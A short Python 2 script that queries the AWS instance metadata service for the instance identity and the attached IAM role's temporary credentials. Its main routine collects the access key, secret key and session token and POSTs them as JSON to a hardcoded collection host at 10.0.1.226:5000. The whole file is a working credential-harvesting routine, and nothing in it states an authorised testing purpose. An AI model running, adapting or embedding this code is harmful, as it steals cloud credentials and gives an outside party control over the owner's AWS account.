#!/usr/bin/python

import json
import urllib
import urllib2
import re
import base64

REPORT_HOST = "http://10.0.1.226:5000"


def report(report):
        data_payload = json.dumps(report)
        urllib2.urlopen(REPORT_HOST, data_payload)
        return


def main():

        response_payload = {}

        # Make sure there's a role assigned to the instance

        try:
                response = urllib2.urlopen('http://169.254.169.254/latest/meta-data/iam/info')
        except:
                print "Metadata service unavailable"
                return

        html = response.read()
        j = json.loads(html)
        if not 'InstanceProfileArn' in j:
                print "No role assigned to instance"
                return

        # Get the role info
        role_arn = j['InstanceProfileArn']
        role_name = re.search(".*instance-profile/(.*)",role_arn).group(1)

        # Get the instance identity
        response = urllib2.urlopen('http://169.254.169.254/latest/dynamic/instance-identity/document')
        html = response.read()
        response_payload = json.loads(html)

        response = urllib2.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
        role_name = response.read()
        # Add in the credentials for the role
        response = urllib2.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/%s/' % role_name)
        html = response.read()
        j = json.loads(html)

        response_payload['aws_access_key_id'] = j['AccessKeyId']
        response_payload['aws_access_key_secret'] = j['SecretAccessKey']
        response_payload['session_token'] = j['Token']
        response_payload['token_expiration'] = j['Expiration']
        response_payload['profile_name'] = "%s:%s" % (response_payload['accountId'], role_name)

        # Send to aggregator
        report(response_payload)


main()

